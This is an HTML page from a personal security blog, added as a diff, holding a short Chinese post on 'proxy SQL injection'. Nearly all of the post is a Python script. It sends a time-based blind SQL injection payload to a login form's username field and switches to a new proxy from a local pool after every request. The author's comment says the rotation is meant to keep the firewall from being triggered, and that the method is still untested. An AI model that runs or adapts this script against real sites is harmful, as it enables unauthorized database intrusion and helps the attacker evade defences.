@@ -1,0 +1,360 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Sql代理注入 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="#!/usr/bin/env python
+# coding: utf-8
+
+import requests
+import time
+
+target = &#39;http://www.vulnerable.com&#39;
+headers = &amp;#123;
+	&#34;Host&#34;: &#34;www.vulnerable.com&#34;,
+	&#34;User-Agent&#34;: &#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0&#34; ,
+	&#39;Connection&#39;: &#39;close&#39;,
+	&#34;Accept-Language&#34;: &#34;zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3&#34;
+&amp;#125;
+
+
+for i in range(1, 28):
+	cookies = &amp;#123;&#34;PHPSESSID&#34;: &#34;f4udpabdluoed7ldhfp90&#34;&amp;#125;
+	payload = &#34;1&#39; or select if(length(user())=&amp;#123;&amp;#125;,sleep(15),1) or &#39;1&#39;=&#39;1&#34;.format(i)
+	data = &amp;#123;&#34;username&#34;: payload, &#34;userpwd&#34;: &#34;abc&#34;&amp;#125;
+
+	def val():
+		while 1:
+			r = requests.get(&#34;http://127.0.0.1:1111/time&amp;lt;4&#34;)
+			proxy = r.content.strip(&#34;[\&#34;]&#34;)
+			ab = time.time()
+			try:
+				test = requests.get(&#34;http://www.vulnerable.com&#34;, headers=headers, proxies=&amp;#123;&#34;http&#34;: proxy&amp;#125;, timeout=5)
+				if test.content:
+					return (time.time() - ab), proxy
+			except Exception:
+				pass
+
+	while 1:
+		testtime, proxy = val()
+		now = time.time()
+		try:
+			req = requests.post(target, headers=headers, proxies=&amp;#123;&#34;http&#34;: proxy&amp;#125;, cookies=cookies, data=data, timeout=200)
+			if req.content:
+				print &#34;[*]i:%s, before:%s, now:%s, Cost:%s&#34; % (i, now, time.time(), time.time()-now)
+				print &#34;[*]proxy:%s, Content:%s, Testtime:%s&#34; % (proxy, len(req.content), testtime)
+				print &#34;[*]TimeCompare: %s&#34; % ((time.time()-now) - testtime)
+				print &#34;=&#34; * 30
+				break
+		except Exception:
+			pass
+开个proxypool.py，然后http://127.0.0.1:1111/time&amp;lt;4找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。
+实测还没测出来，感觉有点悬。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Sql代理注入"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Sql代理注入</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># coding: utf-8</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
+	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
+	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
+	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
+	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
+			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
+			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+			<span class="token keyword">try</span><span class="token punctuation">:</span>
+				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
+			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+				<span class="token keyword">pass</span>
+
+	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
+			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
+				<span class="token keyword">break</span>
+		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
+<p>实测还没测出来，感觉有点悬。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2016/11/08/sql-proxy.html" class="leancloud-visitors view" data-flag-title="Sql代理注入">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2016/12/28/php的zip伪协议.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2016/10/25/cve-2016-6802.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2016-11-08 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
